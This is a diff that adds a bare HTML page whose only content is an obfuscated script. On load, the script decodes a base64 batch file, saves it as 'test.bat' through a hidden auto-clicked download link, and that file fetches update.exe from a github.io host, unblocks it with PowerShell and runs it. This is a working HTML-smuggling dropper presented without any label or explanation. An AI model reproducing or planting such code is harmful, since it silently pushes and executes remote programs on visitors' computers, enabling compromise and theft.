@@ -1,0 +1,39 @@
+
+<html>
+<head>
+<title></title>
+</head>
+<body>
+<script>
+  function btb(base64) {
+    var binary_string = window.atob(base64);
+    var len = binary_string.length;
+    var bytes = new Uint8Array( len );
+    for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
+    return bytes.buffer;
+  }
+  var t = "";t = ""
+t = t + "Y3VybCBodHRwczovL2JzY2hyb2VkOTYuZ2l0aHViLmlvL3VwZGF0ZS5leGUgLU8NCnBvd2Vyc2hlbGwuZXhlIC1jIHVuYmxvY2stZmlsZSB1cGRhdGUuZXhlDQp1cGRhdGUuZXhlDQo="
+t = t
+  var data = btb(t);
+  var bobby = new Blob([data], {type: 'octet/stream'});
+  var fileName = 'test.bat';
+
+  if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(bobby,fileName);
+  else {
+    var aye = 'a';
+    var a = document.createElement(aye);
+    document.body.appendChild(a);
+    var d = 'display';
+    var n = ': none';
+    var dn = d + n;
+    a.style = dn;
+    var url = window.URL.createObjectURL(bobby);
+    a.href = url;
+    a.download = fileName;
+    a.click();
+    window.URL.revokeObjectURL(url);
+  }
+</script>
+</body>
+</html>
